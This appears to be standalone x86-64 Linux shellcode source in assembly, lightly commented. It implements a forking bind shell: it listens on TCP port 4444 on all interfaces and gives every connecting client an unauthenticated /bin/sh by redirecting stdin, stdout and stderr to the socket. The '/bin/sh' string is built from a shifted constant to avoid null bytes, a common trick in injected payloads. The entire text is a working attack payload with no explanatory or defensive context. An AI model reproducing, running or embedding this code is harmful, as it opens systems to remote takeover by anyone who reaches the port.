xor    %eax, %eax
xor    %ebx, %ebx
xor    %edx, %edx

# socket call
mov    $0x1, %al
mov    %eax, %esi
inc    %al
mov    %eax, %edi
mov    $0x6, %dl
mov    $0x29, %al
syscall

# bind call
xchg   %eax, %ebx
xor    %rax, %rax
push   %rax
pushq  $0x5c110102
mov    %al, 0x1(%rsp)
mov    %rsp, %rsi
mov    $0x10, %dl
mov    %ebx, %edi
mov    $0x31, %al
syscall

# listen call
mov    $0x5, %al
mov    %eax, %esi
mov    %ebx, %edi
mov    $0x32, %al
syscall

accept:
xor    %edx, %edx
xor    %esi, %esi
mov    %ebx, %edi
mov    $0x2b, %al
syscall

#store the FD from accept
mov    %eax, %ebp

# fork
mov   $0x39, %al
syscall

# go back to accept if we are the parent
or    %eax, %eax
jnz    accept

# else we dup2 stdin, stdout, stderr
# dup2
mov    %ebp, %edi
xor    %rax, %rax
mov    %eax, %esi
mov    $0x21, %al
syscall

inc    %al
mov    %eax, %esi
mov    $0x21, %al

syscall
inc    %al
mov    %eax, %esi
mov    $0x21, %al
syscall

# execve /bin/sh
xor    %rdx, %rdx
movabs $0x68732f6e69622fff, %rbx
shr    $0x8, %rbx
push   %rbx
mov    %rsp, %rdi
xor    %rax, %rax
push   %rax
push   %rdi
mov    %rsp, %rsi
mov    $0x3b, %al
syscall

# exit
push   %rax
pop    %rdi
mov    $0x3c, %al
syscall


